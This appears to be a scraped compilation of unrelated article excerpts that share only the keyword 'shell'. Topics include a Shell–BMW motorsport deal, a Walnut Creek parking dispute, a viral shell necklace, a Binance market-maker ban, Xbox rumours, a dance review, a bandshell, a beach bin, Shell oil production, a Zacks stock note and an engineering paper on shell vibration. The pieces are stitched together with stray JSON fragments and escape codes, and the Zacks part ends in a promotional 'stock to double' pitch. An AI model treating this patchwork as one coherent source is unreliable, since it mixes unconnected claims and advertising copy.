Now, the collaboration is entering a new decade with the extension and simultaneous expansion of their joint contract. Shell is the Premium Technology, Innovation, and, in the future, also the Energy Partner of BMW M Motorsport. The partnership is visible worldwide in the biggest racing series, including the FIA World Endurance Championship (FIA WEC) and the IMSA WeatherTech SportsCar Championship (IWSC). The collaboration extends far beyond just the racing events.\n\nTen days ago, Shell and BMW M Motorsport celebrated the renewal of their partnership with the spectacular design of the #20 Shell BMW M Hybrid V8 at the FIA WEC season opener in Qatar. The LMDh car will compete in the entire World Championship season, including the legendary 24 Hours of Le Mans (FRA), adorned in Shell's colours. BMW M works driver Sheldon van der Linde (RSA) remains the face of Shell in the cockpit of the BMW M Motorsport race cars. He will be a regular driver for the complete seasons in FIA WEC and IWSC. In both racing series, Shell prominently appears as a partner of BMW M Motorsport, highlighting the global dimension of the collaboration. Together with van der Linde, Shell celebrated its greatest sporting success in 2022 when the young South African became the DTM champion driving the Shell BMW M4 GT3.\n\nStarting from the 2025 season, Shell will simultaneously be the Premium Technology, Innovation, and now also the Energy Partner of BMW M Motorsport. Accordingly, BMW M Motorsport exclusively uses and promotes Shell products such as Shell Helix and Shell EV Plus. As part of their technology and development partnership, Shell and BMW M Motorsport are working on joint future projects. These include more sustainable lubricants, e-fluids for electric vehicles, and innovative fuel and energy concepts for motorsport projects. As Shell is also the official partner of the BMW M Trackdays, BMW M customers also enjoy the Shell premium products.\n\nFranciscus van Meel (CEO of BMW M GmbH): \u201cWithout strong partners like Shell, engagements by BMW M in series production and BMW M Motorsport in racing are unthinkable. The fact that we can look back on ten years of collaboration is extraordinary \u2013 and I am very pleased that we are now reaching the next level together.

(KGO) -- In the East Bay, one neighborhood is bracing for crowds of visitors making the annual trek to see a wildflower superbloom.\n\nIn years past, the small Walnut Creek neighborhood was overrun with thousands of visitors to Shell Ridge Open Space. This weekend, new parking restrictions are bringing some peace back to neighbors.\n\nIt's a flower frenzy in this small Walnut Creek neighborhood. A video from last spring shows just how many people flocked to Sutherland Drive and Virginia Court to access Shell Ridge Open space and see the California poppy superbloom.\n\n\"I mean I can't describe to you--1,500 cars everyday on the weekend,\" said Elise Fornaci from Sutherland Drive and Virginia Court Neighborhood Association.\n\nFornaci says the photo spot likely began with a social media post going viral.\n\nMORE: Advocates fight to keep controversial bike lanes in San Mateo from being cleared for more parking\n\n\"And we ceased to be a little Walnut Creek neighborhood entrance. You're wall-to-wall, bumper-to-bumper traffic up the street,\" Fornaci said.\n\nSo many nature enthusiasts trekked to the neighborhood located in unincorporated Contra Costa County, which became concerned about safety.\n\n\"We're concerned about fire danger. With cars wrapped on both sides of the street, emergency vehicles can't come in,\" Fornaci said.\n\nStarting this weekend is a possible solution and compromise between the county and city of Walnut Creek, where the open space is located. Signs are posted. The neighborhood is now a temporary \"no parking\" zone on weekends--unless you have a permit.\n\nVisitors have to park outside the neighborhood and walk in. Some people say they get it.\n\nMORE: Should Palo Alto parklets be allowed to extend in front of neighboring businesses?\n\n\"It makes sense. If I lived in this neighborhood, I would want restrictions, peace and quiet,\" said John Robinson from Pinole.\n\nOthers, not so much.\n\n\"It's annoying,\" said Curt Heinz.\n\n\"I'm super bummed. I'm a photographer, so this is a popular spot to photograph people,\" said Rose Freedman from San Pablo.\n\n\"It seems like overreach, too much going on, too much government interference on this,\" said Bud Arnott from Danville.\n\nMORE: SFMTA parking ticket scam texts have Bay Area cyber experts warning of evolving fraud trends\n\nThe neighborhood association posted a QR code with alternative entrances to the open space, like Howe Homestead Park, where there's nearly a dozen parking spaces.\n\nContra Costa County Supervisor Ken Carlson told ABC7 News: \"We are partnering with the city of Walnut Creek to provide a workable solution to protecting the safety and quality of life for residents but also provide public access to the open space. I don't believe anyone anticipated the viral response to the wildflower bloom.\"\n\nNeighbors say, so far, the parking restrictions are working but the real test will come later when poppies start to bloom.\n\n\"What we want is for everyone to be happy. This is great people are able to look. Our neighborhood cannot be a parking lot or filled with angry people. This is not a state park,\" Fornaci said.",

Ferentinos can't keep the Juju Vera shell necklace in stock. \"We've sold out of The Petra (the brand's best-seller) three times in a row since Juju Vera launched in July 2024 and now have it on pre-order,\" the accidental entrepreneur, age 33, says over the phone.\n\n\u201cI originally spotted it on Leandra Medine Cohen back in early December, and it was one of those \u2018stop-you-in-your-tracks\u2014wow, that's good\u2019 kind of items,\u201d says Grace Atwood, the lifestyle blogger behind The Stripe and Scratch Pad Substack, who owns the Petra in silver.\n\nSharing a similar enthusiasm is Gabrielle Katz, founder of the PR agency Accent PR_ojects , who has it in brass. \u201cAs a publicist, I\u2019m hyper-aware of how a brand or a product becomes the most desirable and coveted, and, in Juju\u2019s case, she\u2019s struck the perfect balance of elegant, incredibly chic, and timeless,\u201d she says.\n\nGrace Atwood wearing the sterling silver Juju Vera Petra Shell Pendant necklace. (Image credit: Grace Atwood/ Laura Saur\n\nPriced at $595, the necklace is hand-sculpted, soldered, and polished by a team of jewelers in New York City, and it has become a bona fide Internet status symbol. Worn over a Khaite slip dress or paired with a sweater from &Daughter, the Petra signals that you\u2019re tapped into the top tastemakers\u2014either that or you write your own fashion newsletter and set the fashion trends yourself.\n\nThe piece has gone so wildly viral that it\u2019s become something of a meme in the fashion corner of the internet; alongside High Sport\u2019s Kick Pant and The Row\u2019s jelly Mara sandals , you might find Juju Vera\u2019s shell necklace in a starter pack for the chronically online, in-the-know fashion crowd.\n\nIt seemingly came out of nowhere, so how did the Petra Shell Pendant become such an explosive jewelry trend ? Mainly by accident.\n\nStay In The Know Get exclusive access to fashion and beauty trends, hot-off-the-press celebrity news, and more. Contact me with news and offers from other Future brands Receive email from us on behalf of our trusted partners or sponsors\n\nJulia \"Juju\" Ferentinos wearing the Petra pendant necklace. (Image credit: Juju Vera)\n\nBefore she founded Juju Vera, Ferentinos spent years immersed in vintage jewelry, sourcing pieces for publications, films, and private clients. \u201cAfter a long time working with these artifacts\u2014spending hours in places like France\u2019s Saint-Ouen Flea Market and La Lagunilla Market in Mexico City\u2014I started imagining pieces that still channeled the magic, or \u2018juju,\u2019 of my antique and vintage finds, but felt relevant for today,\u201d she says.\n\nThen, in 2023, Ferentinos started making prototypes of original designs purely as a passion project. After sharing a few samples on Instagram, her mock-ups soon caught the eye of Lauren Santo Domingo , the co-founder and chief brand officer of luxury retailer Moda Operandi. \u201cI didn't have any plans to go to market when Lauren reached out to me\u2014my path wasn\u2019t necessarily to even start a jewelry line.\u201d But when Moda calls, you pick up the phone.\n\nShe went on to launch her debut collection\u2014featuring the Petra Shell Pendant, citrine-stone chokers, and buffed silver cuffs fit for modern-day Wonder Woman\u2014in an exclusive Moda Operandi trunk show during the summer of 2024. And Juju Vera suddenly became the name to know.\n\nIt\u2019s remarkable growth for a brand only eight months old, especially in a saturated online landscape where new labels pop up every day. \u201cAll I have to say is I\u2019m glad Juju is getting her bag because, in all my years covering this kind of thing, I have never seen an independent line blow up this quickly,\u201d says Jess Graves , the author of The Love List Substack, who has been writing about fashion for almost two decades.\n\nFerentinos describes the journey\u2014from her flea market daydreams to an unexpected Instagram DM from Domingo and now becoming one of the most in-demand jewelry brands\u2014as nothing short of a whirlwind. She\u2019s especially amazed by the \u201cphenomenon of the Petra Shell Pendant,\u201d explaining, \u201cWe haven\u2019t sent a single marketing email or advertised the Petra at all. People find out about us through someone they follow on Instagram, read about us in a publication, or hear it through word of mouth in real life,\u201d she says. \u201cThe Petra\u2019s been resonating completely organically, and that\u2019s the craziest part.\u201d\n\nJuju Vera's Petra Pendant modeled in its debut lookbook. (Image credit: Juju Vera)\n\nOne big reason for the Petra\u2019s explosive rise is that the fisherman aesthetic is everywhere right now: duffle coats, Breton-striped shirts, and seashell jewelry are surging. It also helps that we\u2019re craving something bolder and more expressive after seasons of barely-there, quiet luxury . \u201cWe were feeling flat off minimalism and looking to feel a little something more,\u201d says Rachel Solomon of the Hey, Mrs. Solomon newsletter. Enter Juju Vera\u2019s shell necklace, which practically says, \u201cHi, hello, I wish I was sipping a spritz while looking at the Aegean Sea.\u201d\n\nWe\u2019re also in a cultural moment that embraces decades we didn\u2019t grow up in (witness the Jackie Kennedy references everywhere and retro capelets popping up on the streets of Milan Fashion Week). It\u2019s no surprise, then, that a scallop-shell pendant inspired by vintage \u201870s French designs, Grecian Art Deco motifs, and a 1968 photo of Mia Farrow in a gold caftan would resonate so strongly. \u201cWhen designing the Petra, I was thinking of this old bygone era of elegance\u2014(ironically) before Instagram\u2014when people really dressed up, even in everyday life,\u201d says Ferentinos. Combine that timeless aesthetic with a timely trend cycle, and you get a perfect storm.\n\nThe inspirations for Juju Vera's shell necklace, including the Mia Farrow reference. (Image credit: Juju Vera)\n\nYes, Ferentinos did have the very good fortune of a trend cycle going her way, but the Juju Vera shell necklace\u2019s success is more substantial than its circumstance. \u201cEvery entrepreneur relies a little bit on luck, but also, the cream rises to the top,\u201d says Solomon. \u201cJuju knows what she\u2019s doing.\u201d\n\nLater this spring, new iterations of the Petra will debut, with pre-orders shipping in late April. And yes, it\u2019s currently trending all over your Instagram feed, but can a shape this classic truly ever go out of style? \"I've always loved all things shells and know I'll be wearing my Petra pendant for years to come, long after the trend has died down,\" says Atwood.\n\nTake it from Ferentinos, too: \u201cI envision the Petra as something you could pick up at a flea market 50 years from now.\" In other words, even if the hype dies down, the shell endures\u2014because while trends may come and go, a really good piece of jewelry has a way of sticking around.",

The details of the compensation plan will be announced later by the respective projects.\n\nMarket makers are companies or people who consistently place buy and sell orders to ensure smooth trading and lower price volatility. However, unethical market-making practices, such as order book manipulation, can distort prices or give unfair benefits to market makers.\n\nThe market maker in question was found to have broken Binance\u2019s rules, which include maintaining a fair order book with balanced buy and sell orders, ensuring adequate liquidity, and preventing disruptive trading behavior. To protect user interests and market integrity, Binance shut down the entity.\n\nFollowing the announcement, investor uncertainty caused GPS to drop more than 14%, while SHELL has since recovered after declining 4%. Binance has reaffirmed its commitment to enforcing stringent adherence to trading standards by all market participants and to taking appropriate action against those who do not comply.\n\nYou might also like: Binance shuts down P2P Cash Zone for in-person crypto trades: report\n\nThis action is a part of Binance\u2019s larger initiative to improve accountability and transparency.

Binance users holding at least 0.01 BNB will be able to influence which projects are listed or removed.\n\nBinance has also added several listing features, including pre-market trading for certain tokens, direct spot listings, and Launchpool farming incentives. According to the exchange, it doesn\u2019t impose listing fees and will let users know when projects allocate marketing budgets for their listing. Such funds will then be given back to users in the form of airdrops.\n\nRegarding the current state of the cryptocurrency sector, Changpeng Zhao, the founder of Binance, noted in a Mar. 10 post on X that too much money is pursuing short-term gains rather than assisting ethical teams aimed at long-term growth.

But when will it arrive and why should people buy it when they can just as easily play the company's games on PC and PlayStation now?\n\nOne reason is, of course, Game Pass, which continues to be incredibly beneficial for most players, which is not available for other formats. But it doesn't seem to be persuasive enough at the moment, so why should the next Xbox change that? Perhaps we now have a better insight from Windows Central editor Jez Corden on The Xbox Two Podcast.\n\nCorden is known to have good insight into what Microsoft is up to, and comments on the rumour that next year's Call of Duty would be a release title for the console, and that development units have been sent out already. He says that the next Xbox is a PC built to be connected to a TV, but no dev kits have been sent out yet:\n\n\"If the info about Call of Duty is accurate [about it launching on the next gen Xbox in 2026], there is no devkit right now. So like the idea that developers have already gotten the next-gen Xbox's dev kit... that's just not accurate.\n\nI mean the whole idea of the next Xbox is that it's gonna be a PC in essence but with a TV friendly shell that also has a specific set of specs in mind, so developers will be building for Windows PC in a way but in such a way that they know exactly what the specs will be. So maybe the Call of Duty rumour could be right but if it is, the dev kit talk is more about what kind of specs that they've been told to target for the next Xbox, not about having any dev kit.\"\n\nIf the next Xbox is a more convenient and easy-to-use PC, it means that it will have a huge range of games, and will also have access to services such as Steam. The days of Xbox gamers being left without certain titles will therefore be well and truly over, in fact they will have more games than ever before as practically everything nowadays comes to PC.\n\nBut it looks like we'll have to wait for it, because Corden says the rumours of a 2026 release are false, stating:\n\n\"But I'm pretty sure new hardware is not 2026, it's 2027.\"\n\nWhat do you think of this concept?",

Everything in the first act was well worth a second viewing, but Rena Butler\u2019s \u201cShell of A Shell of The Shell,\u201d a work new to the DMV which closed the program, stole the show.\n\n\u2018Shell of A Shell of The Shell,\u2019 a work by Rena Butler\u2026took my breath away\u2026 easily the most enthralling piece of dance I have seen this year.\n\n\u201cSomeday Soon,\u201d by choreographer Keerati Jinakunwiphat, opened the evening. When A.I.M. brought the work to Center for the Arts last spring, it had only recently premiered. Writing about it for MD Theatre Guide I said that I wished I could have seen it again. This side of a year later, \u201cSomeday Soon\u201d felt tighter and more meticulous. The sudden changes in movement quality, from sweeping speed to sudden suspension, had the effortless precision of something sanded smooth over many performances.\n\nAmari Frazier\u2019s performance of Paul Singh\u2019s \u201cJust Your Two Wrists\u201d was impeccable. Crisp lines were broken by urgent repeated gestures as Frazier arced from one corner of the stage to another. Immersed in David Lang and Trio Mediaeval\u2019s spectral vocals, the solo felt like a meditation.\n\n\u201cMotorRover,\u201d choreographed by A.I.M Artistic Director Kyle Abraham in collaboration with the A.I.M. dancers and performed by Jamaal Bowman and Donovan Reed, is a work best experienced up close. When I saw the piece in 2024, I was in the back row of the orchestra. The George Mason Center for the Arts is a considerably larger theater than The Kay. Coming from the pre-performance discussion and sitting in the back of the house, I walked away thinking about the context of the work and its relationship to Merce Cunningham\u2019s 1972 \u201cLandrover\u201d to which it is a response. It was a somewhat removed, dry, and predominantly intellectual experience of the piece. Wednesday night in The Kay, I was close enough to hear the dancers breath, to see the sweat dripping off their faces, and feel the palpable connection between them. For a work of many minutes that takes place entirely without music, the physical quality of that relationship was everything. It carried the choreography and gave it an entirely different dimension.\n\nAbraham\u2019s \u201cShow Pony,\u201d danced by Alysia Johhnson, opened the second half of the program. This solo was a striking contrast to \u201cJust Your Two Wrists\u201d in almost every way. With its high legs, popped hips, club lighting, sparkly unitard, and aggressive electric drum corps soundtrack from Jlin, \u201cShow Pony\u201d came out of the gate at eleven and only went up from there.\n\n\u201cShell of A Shell of The Shell,\u201d a work by Rena Butler which premiered in 2024, took my breath away. It is easily the most enthralling piece of dance I have seen this year. It began in haze, two shafts of light cutting through the darkness towards center like skylights in a cave. As the dancers writhed and undulated through the patchy shadows, the effect was ritualistic and primal, almost animalistic like a ceremony of possession out of deep time. As dancer Oliva Wang mouthed a scream from the edge of a pool of light against a distorted vocal in the score, I got goosebumps. The dancers morphed across the stage, the top lights went out, and the cyclorama at the back of the stage popped into white, leaving the dancers in sharp silhouette. They carved across the space and slowly the lights pulsed up. The dancers repeatedly rushed downstage, flinging themselves against the fourth wall of the proscenium, against the edge of the light, only to stagger backwards. They came to the edge again and the lights in the house went up. They were watchful, predatory, and they could see us. The dancers retreated into the shadows and the high shafts of toplight returned, but now the light was broken into a multitude of rays, like afternoon sunshine through the high windows of a church, casting a mosaic pattern across the floor.\n\nDan Scully\u2019s lighting design for \u201cShell\u201d was extraordinary. Regular concert dance goers are used to seeing choreographic ideas developed in a thematic way like a phrase of music, and contemporary dance loves dramatic lighting with stark changes. However, the visual motifs of light in this piece were developed over the course of the work in counterpoint and with the same sophistication as the choreographic themes. The difference and repetition of the visual textures was a key element of building the world the dancers inhabited, and the dancers\u2019 relationship to that light, and the spaces it defined, was one of the central themes of the piece.\n\nIn Plato\u2019s \u201cAllegory of the Cave,\u201d the true forms of reality exist under the sun. Those trapped in the cave see only the shadows those forms cast on the wall of the space in which they are trapped. There is a single truth, a single source of light, and a single shell. The truth exists outside the shell and only shades of it exist within. \u201cShell\u201d offers a different theory. Butler\u2019s program note states, \u201c\u2018Shell of A Shell of The Shell\u2019 dissects themes of self-excavation in restrictive spaces to open the mind\u2019s eye of cultural differences and the challenges one may face in operating under, building, and dismantling perpetuated systems or habits.\u201d In these manifold spaces defined by light, there is not a single cave and a single sun, but a haunted labyrinth full of shadows and light twisting in on itself. True forms are not definitive but unknowable, brightly lit in the reality outside of our cave; rather, it is in the act of peeling back the layers of many shells that we find the truth of experience.\n\nRunning Time: Approximately two hours with one 15-minute intermission.\n\nAdvisory: Includes the use of stage fog.\n\n\u201cA.I.M. by Kyle Abraham\u201d ran March 5-6, 2025 in The Kay Theater at The Clarice Smith Performing Arts Center, University of Maryland, 8270 Alumni Drive, College Park, MD 20742.

            "content": "VENTNOR \u2013 The city held a groundbreaking Friday afternoon for the new bandshell at the Newport Avenue beachfront park that will replace the aged gazebo that once stood there. But it would not have been possible without the support of community volunteers who pledged their financial support in a big way.\n\nThe project has been on the drawing board for more than 24 months. The city scaled back the original bandshell design prepared by William McLees Architecture of Somers Point to make it more affordable for taxpayers.\n\nFirst-round bid offerings came in as high as $747,000, which was more than the city was prepared to spend on the project. Following two subsequent rounds of bidding and redesigns that lowered the cost, the city awarded a $233,000 contract Jan. 9 for Massett Building Company of Egg Harbor Township to build the stage where musicians perform for the Summer Beach Jam concert series.\n\n\u201cFor concerts you don\u2019t sell tickets for, it\u2019s hard to make that up,\u201d Mayor Tim Kriebel said when the contract was finally awarded.\n\nOn Friday, he said the community-supported project is a way to \u201cmake the town a little better for each other\u201d but it would not have been possible without the \u201cgenerous pledge\u201d of the Ventnor Beautification Committee led by resident Shelley D\u2019Orazio.\n\nThe new design was simplified but will still serve its purpose, have a unique shape and make a statement. The design will mesh with two of McLees\u2019 previous designs for the Beach Patrol Headquarters and the Concession Stand on the Ventnor Pier. Plantings and accessories can be added later, Kriebel said. The city is hoping to get the bandshell completed in time for the first concert on June 28.\n\nPROVIDED/Ventnor Beautification Chairwoman Shelley D'Orazio and her spouse, Peter D'Orazio at the bandshell groundbreaking.\n\n\n\nThe Beautification Committee has been holding fundraisers for the last 12 years, except for the years of Hurricane Sandy and COVID pandemic, to raise money to beautify the city. Past projects included banners, benches and trash and recycling containers distributed throughout the city.\n\nDuring the groundbreaking, D\u2019Orazio pledged $100,000 for the project, with most of the funding coming from the proceeds of the group\u2019s annual Chef\u2019s Night Out event. The next event will be held May 18. Tickets go on sale April 1 and are expected to sell out quickly.\n\nKriebel said the group is successful because D\u2019Orazio runs the volunteer organization like a business.\n\n\u201cThis is a big deal,\u201d D\u2019Orazio said about making a $100,000 contribution toward the city. \u201cEveryone involved helped to make this happen, including our volunteers who sold tickets for the event, the hosts and musicians who volunteer their time, and all the people who bought tickets to Chef\u2019s Night Out.\u201d\n\nD'Orazio gave special recognition to the restaurants, pizza parlors, bakeries, liquor stores and their staffs who provide the food and drinks at no cost to the committee.\n\nBeautification Committee volunteer Rose Hamilton said the group works \u201ctirelessly\u201d to make their programs successful, but they wouldn\u2019t be possible without the support of the community.\n\nCommissioner Lance Landgraf said the bandshell will make the \u201cbest concert series in the county\u201d even better.\n\n\u201cThis beach is filled with people enjoying the free concerts every Saturday night,\u201d he said. Landgraf is often there with his wife Kathy and their pup, Boomer.\n\n\u201cIt took awhile to get the design right because it was a little bit expensive,\u201d he said.\n\nCommissioner Maria Mento thanked the Beautification Committee stating, \u201cWe couldn\u2019t do it without you.\u201d\n\nShe also commended the Ventnor Special Events team that organizes community events throughout the year.\n\nAdding free community events and improving public property are some of the ways the city has worked to create economic development opportunities and attract visitors to come to the town for their holiday vacations.\n\n\n\n\n\nCopyright Access Network 2025\n\n\n\n",

It is hoped it will make it easier for residents and visitors to recycle their plastic bottles.\n\nTo bring the shell design to life, East Lindsey District Council teamed up with Lincolnshire firm Blackrow Engineering.

Plastic waste on beaches is particularly harmful to marine life and birds as well as being unsightly for those who enjoy our Blue-flag beach.\"\n\nGary Pexman, director at Blackrow Engineering said: \"The bin needed to be not only functional but also aesthetically pleasing, fitting seamlessly into the seaside environment. Sean McCoid, Blackrow's senior draughtsperson, took charge of the design phase. He acquired a Fasciolaria Tulipa shell to serve as the model for the bin, meticulously setting out the sizes and dimensions.\n\nADVERTISEMENT\n\n\"The intricate process of crafting the structure was undertaken by Blackrow's skilled tradesman Paul Moore, with the assistance of apprentice James Gill. The duo dedicated approximately 250 hours to complete the build. Their expertise and attention to detail were crucial in bringing the design to life, resulting in a stunning and functional piece of art.\"\n\nHe continued: \"Once the structure was completed, it was handed over to the Blackrow paint shop team for lacquering. This final step was necessary to protect the sculpture from the harsh coastal weather conditions and ensure its longevity.\"",

The Phase 4 production is flowing to the existing Gumusut-Kakap Semi-submersible Floating Production System located off the coast of Sabah, offshore Malaysia, where SSPC is the operator.\n\nThe GKGJE Phase 4 development includes a subsea tie-back that straddles the Malaysia - Brunei border and involves the drilling of three producer wells and one water injection well. Located in water depths of 1,200 meters (3,937 ft), Gumusut-Kakap was the first deepwater project for Shell in Malaysia and began production in 2014.\n\nThe new development contributes towards Shell\u2019s commitment to bring online new upstream projects between 2023 and 2025, which will deliver an additional combined 500,000 barrels of oil equivalent per day (boe/d) at peak production, the supermajor said.\n\nSo far this year, Shell has launched commercial production at the Whale field in the Gulf of Mexico, eyeing peak output levels of 100,000 barrels daily. Shell has also resumed oil and gas production from the Penguins field in the UK North Sea with a new floating, production, storage and offloading (FPSO) facility, replacing the previous export route via the Brent Charlie platform, which ceased production in 2021.\n\nShell was one of the first European majors to pivot back to oil and gas in a 2023 strategy to continue investing in oil and gas production and selectively pour capital into renewable energy solutions.\n\nShell\u2019s CEO Wael Sawan has said that reducing global oil and gas production would be \u201cdangerous and irresponsible\u201d as the world still needs those hydrocarbons.\n\nBy Charles Kennedy for Oilprice.com\n\nMore Top Reads From Oilprice.com",

            "content": "The latest trading session saw Shell (SHEL) ending at $66.79, denoting a +1.18% adjustment from its last day's close. This move outpaced the S&P 500's daily gain of 0.55%. Meanwhile, the Dow experienced a rise of 0.52%, and the technology-dominated Nasdaq saw an increase of 0.7%.\n\nHeading into today, shares of the oil and gas company had lost 0.23% over the past month, outpacing the Oils-Energy sector's loss of 6.33% and the S&P 500's loss of 5.56% in that time.\n\nMarket participants will be closely following the financial results of Shell in its upcoming release. The company is predicted to post an EPS of $1.98, indicating a 16.81% decline compared to the equivalent quarter last year. Meanwhile, the Zacks Consensus Estimate for revenue is projecting net sales of $79.93 billion, up 7% from the year-ago period.\n\nFor the annual period, the Zacks Consensus Estimates anticipate earnings of $7.94 per share and a revenue of $316.17 billion, signifying shifts of +5.59% and +9.39%, respectively, from the last year.\n\nAdditionally, investors should keep an eye on any recent revisions to analyst forecasts for Shell. These revisions help to show the ever-changing nature of near-term business trends. Hence, positive alterations in estimates signify analyst optimism regarding the company's business and profitability.\n\nOur research shows that these estimate changes are directly correlated with near-term stock prices. To exploit this, we've formed the Zacks Rank, a quantitative model that includes these estimate changes and presents a viable rating system.\n\nThe Zacks Rank system, which varies between #1 (Strong Buy) and #5 (Strong Sell), carries an impressive track record of exceeding expectations, confirmed by external audits, with stocks at #1 delivering an average annual return of +25% since 1988. Over the past month, there's been a 6.46% rise in the Zacks Consensus EPS estimate. As of now, Shell holds a Zacks Rank of #3 (Hold).\n\nWith respect to valuation, Shell is currently being traded at a Forward P/E ratio of 8.32. This signifies a premium in comparison to the average Forward P/E of 7.52 for its industry.\n\nWe can additionally observe that SHEL currently boasts a PEG ratio of 0.92. The PEG ratio is similar to the widely-used P/E ratio, but this metric also takes the company's expected earnings growth rate into account. The Oil and Gas - Integrated - International industry had an average PEG ratio of 1.01 as trading concluded yesterday.\n\nThe Oil and Gas - Integrated - International industry is part of the Oils-Energy sector. At present, this industry carries a Zacks Industry Rank of 69, placing it within the top 28% of over 250 industries.\n\nThe Zacks Industry Rank gauges the strength of our industry groups by measuring the average Zacks Rank of the individual stocks within the groups. Our research shows that the top 50% rated industries outperform the bottom half by a factor of 2 to 1.\n\nDon't forget to use Zacks.com to keep track of all these stock-moving metrics, and others, in the upcoming trading sessions.\n\nResearch Chief Names \"Single Best Pick to Double\"\n\nFrom thousands of stocks, 5 Zacks experts each have chosen their favorite to skyrocket +100% or more in months to come. From those 5, Director of Research Sheraz Mian hand-picks one to have the most explosive upside of all.\n\nThis company targets millennial and Gen Z audiences, generating nearly $1 billion in revenue last quarter alone. A recent pullback makes now an ideal time to jump aboard. Of course, all our elite picks aren\u2019t winners but this one could far surpass earlier Zacks\u2019 Stocks Set to Double like Nano-X Imaging which shot up +129.6% in little more than 9 months.\n\nWant the latest recommendations from Zacks Investment Research?

            "content": "Model validation\n\nAs a proven, reliable, and widely used numerical calculation method, the FEM (finite element method) is adapted here to verify the rationality and correctness of the present semi-analytical model (hereafter referred to as SAM) of free vibration of the perforated hard-coating cylindrical shell. The corresponding FEM of free vibration of the shell is established by using ABAQUS software with 4-node doubly curved S4R shell element. The composite structure is reduced to a single-layer shell mid-surface with double-layer material cross-section. The employed material and geometrical parameters of the perforated hard-coating cylindrical shell are given in Tables 1 and 2, respectively. The well-known Lanczos solution method is applied to solve the model. According to Vaidya et al.27, Wang et al.28 and Belazreg et al.29, a mesh convergence test ensures numerical accuracy by verifying that simulation results are independent of mesh size, enhancing reliability. The results of convergence analysis of the established model is shown in Fig. 3, in which a transformed frequency parameter \\({P_{f1}}=f - {f_{n,1}}\\) is introduced to facilitate mesh dependence analysis. Here f represents the calculated natural frequency, and\\({f_{n,1}}\\) denotes an intermediate frequency corresponding to the circumferential wave number n, given in Table 3. From the parametric analysis, we could find that the first 12 natural frequencies of the shell gradually decrease and reach a stable state with the decrease of the element size, indicating that the element size \\(\\varpi\\)= 1 mm is fine enough for the FEM of free vibration of the shell to achieve reliable and accurate results. The total number of nodes and elements is 106,109 and 107,327, respectively. The final FEM with clamped-free boundary condition is shown in Fig. 4.\n\nTable 1 Material parameters of the perforated hard-coating cylindrical shell.

Full size table\n\nAdditionally, the truncation error analysis of the second kind of Chebyshev polynomials used in the developed semi-analytical model is performed, so as to determine the optimal the truncation order N for accurate and reliable solution, as shown in Fig. 5. The results demonstrate that all the first 12 natural frequencies of the shell decrease and gradually reach a stable state with the increase of the truncation order. The maximum relative error between the semi-analytical results under the conditions of N = 7 and N = 8 is less than 0.034%, which indicates that the truncation order N = 7 is good enough to achieve sufficient precise semi-analytical results.\n\nTo verify the correctness of the developed semi-analytical model and the presented axial domain decomposition method, the first 12 natural frequencies and modal shapes calculated by SAM with the truncation order N = 7 are compared with the FEM results under the condition of element size \\(\\varpi\\)= 1 mm, as given in Tables 4 and 5, respectively. Results show that the first 12 natural frequencies and modal shapes of the perforated hard-coating cylindrical shell calculated by FEM and SAM are basically the same, and the maximum relative error of the natural frequencies is only 1.89%, which effectively validates the validity of the developed semi-analytical model and the presented axial domain decomposition method.\n\nFig. 5 Truncation error analysis of the second kind of Chebyshev polynomials.

Full size table\n\nMoreover, to further validate the correctness, accuracy, and feasibility of the presented axial domain decomposition method, the calculated natural frequencies in Ref30. are used for comparison with SAM calculation values. It is worth noting that the material and geometric parameters in Ref30. are slightly different. To ensure comparability of results, the coating density \u03c1 coating and inner radius R 0 of the shell are set to 5560 kg/m3 and 0.142 m for SAM, respectively. The comparison between the natural frequencies calculated by SAM and results in Ref30. is given in Table 6.\n\nTable 6 Comparison between the natural frequencies calculated by SAM and results in ref30. Full size table\n\nImpact analysis of the perforation radius\n\nSince the perforation treatment can weaken the stiffness and strength of the shell structure, the variation of the perforation radius and perforation number would have important influence on the vibration characteristics of the composite hard-coating cylindrical shell with multiple circular perforations. Firstly, the impact analysis of the perforation radius on the first 12 natural frequencies of the perforated hard-coating cylindrical shell is conducted, as shown in Fig. 6. The variation range of the perforation radius is 1\u201315 mm with interval of 2 mm.\n\nResults demonstrate that the natural frequencies of the perforated shell decrease faster and faster with the increase of the perforation radius, except for the circumferential wave number n = 5 and 10. With the increase of the perforation radius, the natural frequencies corresponding to the circumferential wave number n = 5 and 10 both show a monotonically increasing trend of change, while the variation rates appear to increase first and then gradually decrease. The results reveal that when the center positions of the circular perforation coincident with the wave peaks or throughs of the modal shape (that is \\(n={{{N_\\theta }} \\mathord{\\left/ {\\vphantom {{{N_\\theta }} 2}} \\right. \\kern-0pt} 2}\\) and \\(n={N_\\theta }\\)), the influence law of the perforation radius on the natural frequencies undergoes a reversal. That\u2019s because the wave peaks or throughs of the modal shape are the positions with the minimum curvature of the shell. Smaller curvature can significantly increase the structural stiffness31. Thus, in such special positions, the decrease amplitude of the structural stiffness would be smaller than the decrease amplitude of the structural mass with the increase of the perforation radius. The special phenomenon can provide an important theory support for the vibration reduction design of the perforated hard-coating cylindrical shell. Moreover, based on the Global Sensitivity Analysis (GSA) method32, the sensitivity analysis of the first 12 natural frequencies of the shell on the perforation radius is conducted, as shown in Fig. 7. Results indicate that the perforation radius has notable effects on the natural frequencies corresponding to n = 1 and 11, and has minimal effects on the natural frequencies corresponding to n = 3 and 10. On the while, the vibration characteristics of the shell is rather sensitive to the variation of the perforation radius.\n\nFig. 6 Influence of the perforation radius on the first 12 natural frequencies. Full size image\n\nFig. 7 Sensitivity coefficients of the first 12 natural frequencies on the perforation radius. Full size image\n\nImpact analysis of the axial perforation number\n\nUnder the condition of uniform distribution of axial perforation, the impact analysis of the axial perforation number on the first 12 natural frequencies of the perforated hard-coating cylindrical shell is conducted, as shown in Fig. 8. The variation range of the axial perforation number is 1\u201310 with interval of 1. Results demonstrate that the natural frequencies of the shell decrease with the increase of the axial perforation number, and the variation rates appear to increase first and then gradually decrease, except for the circumferential wave number n = 5 and 10. With the increase of the axial perforation number, the natural frequencies corresponding to the circumferential wave number n = 5 and 10 both show a linearly increasing trend of change, which reveals that when the center positions of the circular perforations coincident with the wave peaks or throughs of the modal shape (that is \\(n={{{N_\\theta }} \\mathord{\\left/ {\\vphantom {{{N_\\theta }} 2}} \\right. \\kern-0pt} 2}\\) and \\(n={N_\\theta }\\)), the influence law of the axial perforation number on the natural frequencies undergoes a reversal. The sensitivity analysis of the first 12 natural frequencies of the shell on the axial perforation number is conducted, as shown in Fig. 9. Results indicate that the axial perforation number has notable effects on the natural frequencies corresponding to n = 9 and 12, and has minimal effects on the natural frequencies corresponding to n = 1. Comparatively, the vibration characteristics of the shell are insensitive to the variation of the axial perforation number.\n\nFig. 8 Influence of the axial perforation number on the 